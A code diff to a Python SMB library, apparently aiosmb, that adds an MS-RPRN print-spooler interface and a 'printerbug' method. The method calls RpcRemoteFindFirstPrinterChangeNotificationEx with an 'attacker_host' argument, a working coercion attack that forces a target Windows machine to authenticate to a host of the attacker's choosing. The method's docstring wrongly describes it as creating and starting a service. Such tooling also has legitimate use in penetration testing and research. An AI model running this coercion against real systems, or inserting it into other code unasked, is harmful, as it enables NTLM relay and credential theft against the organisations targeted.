@@ -13,6 +13,8 @@ from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSAD
 from aiosmb.dcerpc.v5.interfaces.drsuapimgr import SMBDRSUAPI
 from aiosmb.dcerpc.v5.interfaces.servicemanager import SMBRemoteServieManager
 from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRP
+from aiosmb.dcerpc.v5.interfaces.rprnmgr import SMBRPRN
+
 from aiosmb.commons.utils.decorators import red, rr, red_gen, rr_gen
 from aiosmb.commons.exceptions import SMBMachineException
 
@@ -20,6 +22,7 @@ from aiosmb.commons.interfaces.blocking.file.file import SMBBlockingFileMgr
 from aiosmb.commons.interfaces.blocking.file.blockingfile import SMBBlockingFile
 from aiosmb.commons.utils.apq import AsyncProcessQueue
 
+from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB
 
 def req_srvs_gen(funct):
 	async def wrapper(*args, **kwargs):
@@ -119,6 +122,21 @@ def req_servicemanager(funct):
 			raise e
 	return wrapper
 
+def req_rprn(funct):
+	async def wrapper(*args, **kwargs):
+		this = args[0]
+		try:
+			if 'RPRN' in this.privtable:
+				if this.privtable['RPRN'] == False:
+					raise SMBMachineException('RPRN failed to open. Probably permission issues.')
+			if this.rprn is None:
+				await rr(this.connect_rpc('RPRN'))
+			x = await funct(*args, **kwargs)
+			return x
+		except Exception as e:
+			raise e
+	return wrapper
+
 class SMBMachine:
 	def __init__(self, connection):
 		self.connection = connection
@@ -132,6 +150,7 @@ class SMBMachine:
 		self.samr = None
 		self.lsad = None
 		self.rrp = None
+		self.rprn = None
 
 		self.filesystem = None
 		self.servicemanager = None
@@ -174,6 +193,11 @@ class SMBMachine:
 			self.privtable['RRP'] = False
 			await rr(self.rrp.connect())
 			self.privtable['RRP'] = True
+		elif service_name.upper() == 'RPRN':
+			self.rprn = SMBRPRN(self.connection)
+			self.privtable['RPRN'] = False
+			await rr(self.rprn.connect())
+			self.privtable['RPRN'] = True
 		else:
 			raise Exception('Unknown service name : %s' % service_name)
 		return True, None
@@ -404,6 +428,23 @@ class SMBMachine:
 
 		return True, None
 	
+	@req_rprn
+	async def printerbug(self, attacker_host):
+		"""
+		Creates a service and starts it.
+		Does not create files! there is a separate command for that!
+		"""
+		print('opening printer')
+		handle, _ = await rr(self.rprn.open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip()))
+		print('got handle %s' % handle)
+		resp, _ = await rr(self.rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
+			handle,
+			PRINTER_CHANGE_ADD_JOB,
+			pszLocalMachine = '\\\\%s\x00' % attacker_host,
+
+		))
+		print('got resp! %s' % resp)
+		
 
 	async def stop_service(self):
 		pass
